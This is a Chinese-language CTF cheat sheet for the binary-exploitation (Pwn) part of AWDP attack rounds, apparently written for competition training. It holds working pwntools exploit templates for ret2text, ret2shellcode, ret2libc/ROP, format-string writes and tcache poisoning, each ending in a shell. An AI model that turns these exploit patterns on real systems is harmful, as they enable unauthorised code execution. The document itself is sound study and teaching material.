# AWDP Break 攻击篇 — Pwn 方向

## 一、拿到题目后的第一步

1. **下载二进制文件**，通常是 ELF 格式的 Linux 可执行文件
2. **基本信息收集**：
   ```bash
   file pwn1            # 查看文件类型（32/64位、静态/动态链接）
   checksec pwn1        # 查看保护机制
   strings pwn1 | grep flag  # 快速搜索有无明文 flag
   ```
3. **checksec 结果解读**：

| 保护机制 | 含义 | 关闭时的利用方式 |
|----------|------|-----------------|
| **NX** (No Execute) | 栈不可执行 | 关闭 → 可以在栈上执行 shellcode |
| **Canary** | 栈溢出保护 | 关闭 → 直接覆盖返回地址 |
| **PIE** | 地址随机化 | 关闭 → 地址固定，可直接用 |
| **RELRO** | GOT 表保护 | Partial → 可以改写 GOT |

4. **用 IDA/Ghidra 反编译**，找到漏洞函数

---

## 二、栈溢出（Stack Overflow）

### 识别特征
- 使用 `gets()`、`scanf("%s")`、`read()` 读取超过缓冲区大小的数据
- 没有开启 Canary 保护

### 2.1 ret2text（最简单）

**条件**：程序中已有后门函数（如 `system("/bin/sh")` 或 `cat flag`）

```python
from pwn import *

p = remote('ip', port)  # 连接靶机
# p = process('./pwn1')  # 本地调试

# 计算偏移量（用 cyclic 或 gdb）
# cyclic 200 → 输入 → 看崩溃地址 → cyclic_find(崩溃地址)
offset = 0x28 + 8  # 缓冲区大小 + rbp（64位）

backdoor = 0x401186  # 后门函数地址（IDA 中查看）

payload = b'A' * offset + p64(backdoor)
p.sendline(payload)
p.interactive()
```

### 2.2 ret2shellcode

**条件**：NX 关闭（栈可执行）

```python
from pwn import *

context(arch='amd64', os='linux')
p = remote('ip', port)

shellcode = asm(shellcraft.sh())  # 自动生成 shellcode
buf_addr = 0x7fffffffe000       # 缓冲区地址（需要泄露或已知）

offset = 0x28 + 8
payload = shellcode.ljust(offset, b'\x90') + p64(buf_addr)
p.sendline(payload)
p.interactive()
```

### 2.3 ret2libc

**条件**：NX 开启，没有后门函数，动态链接

**思路**：利用 libc 中的 `system()` 和 `"/bin/sh"` 字符串

```python
from pwn import *

p = remote('ip', port)
elf = ELF('./pwn1')
libc = ELF('./libc.so.6')  # 题目通常会给 libc

# Step 1: 泄露 libc 地址
# 利用 puts@plt 打印 puts@got 的真实地址
pop_rdi = 0x401233          # ROPgadget --binary pwn1 | grep "pop rdi"
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

offset = 0x28 + 8

# 第一次溢出：泄露 puts 真实地址
payload1 = b'A' * offset
payload1 += p64(pop_rdi) + p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main_addr)  # 返回 main 继续利用

p.sendline(payload1)
p.recvuntil(b'\n')  # 根据实际输出调整
puts_real = u64(p.recv(6).ljust(8, b'\x00'))

# Step 2: 计算 libc 基址
libc_base = puts_real - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# Step 3: 第二次溢出，调用 system("/bin/sh")
# 注意 64 位需要栈对齐，加一个 ret gadget
ret = 0x40101a
payload2 = b'A' * offset
payload2 += p64(ret)        # 栈对齐
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()
```

### 2.4 ROP 链构造

```bash
# 查找 gadget
ROPgadget --binary pwn1 | grep "pop rdi"
ROPgadget --binary pwn1 | grep "pop rsi"
ROPgadget --binary pwn1 | grep "pop rdx"
ROPgadget --binary pwn1 --ropchain  # 自动生成 ROP 链

# 常用 gadget
pop rdi; ret          → 控制第一个参数
pop rsi; pop r15; ret → 控制第二个参数
pop rdx; ret          → 控制第三个参数（少见）
ret                   → 栈对齐（Ubuntu 18.04+ 需要）
```

---

## 三、格式化字符串漏洞

### 识别特征
- `printf(buf)` — 用户输入直接作为格式化字符串
- 正确写法应该是 `printf("%s", buf)`

### 3.1 信息泄露

```bash
# 泄露栈上数据
AAAA%p%p%p%p%p%p%p%p

# 指定偏移位置读取（第 N 个参数）
%6$p     # 读取第 6 个参数（十六进制）
%6$s     # 读取第 6 个参数指向的字符串
%6$lx    # 64 位下读取

# 确定偏移量：输入 AAAA%p%p%p... 看哪个位置出现 0x41414141
```

### 3.2 任意地址写

```python
from pwn import *

p = remote('ip', port)

# 用 fmtstr_payload 自动生成（pwntools 神器）
# 将 target_addr 处的值改为 target_value
payload = fmtstr_payload(offset, {target_addr: target_value})
p.sendline(payload)

# 手动构造（32 位示例）
# 往地址 0x0804A000 写入值 0x1234
# %n 写入已输出的字符数
payload = p32(0x0804A000) + b'%4660c%6$n'
# 4660 = 0x1234 - 4（已输出的4字节地址）
```

### 3.3 常见利用目标

```
1. 改写 GOT 表 → 将某函数的 GOT 改为 system 地址
2. 改写返回地址 → 劫持控制流
3. 改写 __malloc_hook / __free_hook → 调用 system
4. 泄露 canary → 绕过栈保护
5. 泄露 libc 地址 → 配合 ret2libc
```

---

## 四、堆利用（Heap Exploitation）

### 识别特征
- 程序有 `malloc()` / `free()` 操作
- 存在 UAF（Use After Free）、Double Free、堆溢出

### 4.1 UAF（Use After Free）

```
原理：
1. malloc(A)  → 分配堆块 A
2. free(A)    → 释放 A（但指针未清零）
3. malloc(B)  → B 可能分配到 A 的位置
4. 使用 A     → 实际操作的是 B 的数据
```

### 4.2 Tcache Poisoning（glibc 2.26+，最常见）

```python
# 思路：修改 tcache 链表的 next 指针，分配到任意地址
# 1. malloc(A), malloc(B)
# 2. free(A), free(B)  → tcache: B → A
# 3. 修改 B 的 fd 指针为 target_addr
# 4. malloc() → 得到 B
# 5. malloc() → 得到 target_addr 处的堆块
# 6. 写入数据 → 任意地址写

from pwn import *
p = remote('ip', port)

# 具体操作取决于题目的菜单功能
# 通常有 add / delete / edit / show 四个功能
def add(size, content):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'size:', str(size).encode())
    p.sendafter(b'content:', content)

def delete(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'index:', str(idx).encode())

def show(idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'index:', str(idx).encode())

def edit(idx, content):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'index:', str(idx).encode())
    p.sendafter(b'content:', content)
```

### 4.3 Double Free

```
glibc 2.27 及以下 tcache 没有 double free 检测：
1. free(A)
2. free(A)  → tcache: A → A（循环链表）
3. malloc() → 得到 A
4. 修改 A 的 fd 为 target
5. malloc() → 得到 A
6. malloc() → 得到 target

glibc 2.29+ 有 key 检测，需要先修改 key 字段绕过
```

### 4.4 Off-by-One / Off-by-Null

```
堆溢出一个字节（通常是 \x00），可以修改下一个堆块的 size 字段
→ 造成堆块重叠（Overlapping Chunks）
→ 进而实现 UAF 或任意写
```

---

## 五、常用 pwntools 速查

```python
from pwn import *

# 连接
p = remote('ip', port)       # 远程
p = process('./pwn1')         # 本地

# 设置架构
context(arch='amd64', os='linux', log_level='debug')

# 收发数据
p.send(data)                  # 发送（不带换行）
p.sendline(data)              # 发送（带换行）
p.sendafter(b'prompt', data)  # 等到 prompt 再发送
p.sendlineafter(b'>', data)   # 等到 > 再发送一行

p.recv(n)                     # 接收 n 字节
p.recvline()                  # 接收一行
p.recvuntil(b'flag')          # 接收直到 flag

# 打包/解包地址
p64(0x401234)                 # 64 位地址打包
p32(0x08041234)               # 32 位地址打包
u64(data.ljust(8, b'\x00'))   # 64 位地址解包
u32(data)                     # 32 位地址解包

# ELF 操作
elf = ELF('./pwn1')
elf.plt['puts']               # puts@plt 地址
elf.got['puts']               # puts@got 地址
elf.symbols['main']           # main 函数地址

# LibcSearcher（不给 libc 时）
from LibcSearcher import *
libc = LibcSearcher('puts', puts_real_addr)
libc_base = puts_real_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')

# GDB 调试
gdb.attach(p, 'b *0x401234')  # 附加调试
```

---

## 六、快速判断利用方式的决策树

```
checksec 结果
│
├─ 无 NX → ret2shellcode
│
├─ 有 NX，无 Canary
│   ├─ 有后门函数 → ret2text
│   ├─ 静态链接 → ROP（程序自带大量 gadget）
│   └─ 动态链接 → ret2libc
│
├─ 有 Canary
│   ├─ 有格式化字符串 → 泄露 canary → 栈溢出
│   └─ 有其他信息泄露 → 泄露 canary → 栈溢出
│
└─ 有堆操作（malloc/free）
    ├─ UAF → tcache poisoning / fastbin attack
    ├─ 堆溢出 → overlapping chunks
    └─ Double Free → tcache dup
```
